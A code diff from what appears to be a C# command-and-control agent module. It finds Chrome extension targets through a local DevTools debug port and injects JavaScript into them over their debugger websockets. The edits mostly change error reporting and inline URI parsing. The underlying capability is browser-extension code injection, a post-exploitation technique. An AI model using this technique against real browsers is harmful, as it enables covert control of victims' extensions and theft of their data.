@@ -29,10 +29,7 @@ namespace Agent
                 }
                 catch (Exception e)
                 {
-                    if (this.config.debug)
-                    {
-                        ReturnOutput(e.ToString(), task_id);
-                    }
+                    ReturnOutput(e.ToString(), task_id);
                     return "";
                 }
 
@@ -64,16 +61,12 @@ namespace Agent
         {
             try
             {
-                var uri = new Uri(extension.webSocketDebuggerUrl);
-                response = InjectJs(jsCode, uri, task_id);
+                response = InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl), task_id);
                 return true;
             }
             catch (Exception e)
             {
-                if (this.config.debug)
-                {
-                    ReturnOutput("Failed to parse URI: " + extension.webSocketDebuggerUrl + Environment.NewLine + e.ToString(), task_id);
-                }
+                ReturnOutput(e.ToString(), task_id);
             }
             response = "";
             return false;
@@ -82,15 +75,11 @@ namespace Agent
         {
             try
             {
-                var uri = new Uri(extension.webSocketDebuggerUrl);
-                return InjectJs(jsCode, uri, task_id);
+                return InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl), task_id);
             }
             catch (Exception e)
             {
-                if (this.config.debug)
-                {
-                    ReturnOutput("Failed to parse URI: " + extension.webSocketDebuggerUrl + Environment.NewLine + e.ToString(), task_id);
-                }
+                ReturnOutput(e.ToString(), task_id);
                 return "";
             }
         }
@@ -105,10 +94,7 @@ namespace Agent
                 }
                 catch (Exception e)
                 {
-                    if (this.config.debug)
-                    {
-                        ReturnOutput(e.ToString(), task_id);
-                    }
+                    ReturnOutput(e.ToString(), task_id);
                     return "";
                 }
 
@@ -116,15 +102,7 @@ namespace Agent
                 var message = new RuntimeEvaluator(jsCode);
                 if (!WebSocketHelper.TrySendMessage(webSocket, message.toJson()).Result)
                 {
-                    if (this.config.debug)
-                    {
-                        ReturnOutput("Failed to send message.", task_id);
-                    }
                     return "";
-                }
-                if (this.config.debug)
-                {
-                    ReturnOutput("Waiting for response.", task_id);
                 }
                 return WebSocketHelper.ReceiveMessage(webSocket).Result;
             }
@@ -139,6 +117,7 @@ namespace Agent
                     // Fetch list of targets from DevTools Protocol
                     string targetsUrl = $"http://localhost:{config.debug_port}/json/list";
                     string targetsJson = client.GetStringAsync(targetsUrl).Result;
+                    
                     if (this.config.debug)
                     {
                         ReturnOutput(targetsJson, task_id);
@@ -156,10 +135,7 @@ namespace Agent
                 }
                 catch (Exception e)
                 {
-                    if (this.config.debug)
-                    {
-                        ReturnOutput(e.ToString(), task_id);
-                    }
+                    ReturnOutput(e.ToString(), task_id);
                 }
             }
             return extensions;
@@ -173,12 +149,10 @@ namespace Agent
 
             if (!TryInjectJs(extension, "chrome.runtime.getManifest()", task_id, out var response)) 
             {
-                if (this.config.debug)
-                {
-                    ReturnOutput("Error getting manifest for " + extension.id + " " + response, task_id);
-                }
+                ReturnOutput("Error getting manifest for " + extension.id + " " + response, task_id);
                 return null; 
             }
+
             if (this.config.debug)
             {
                 ReturnOutput(response, task_id);
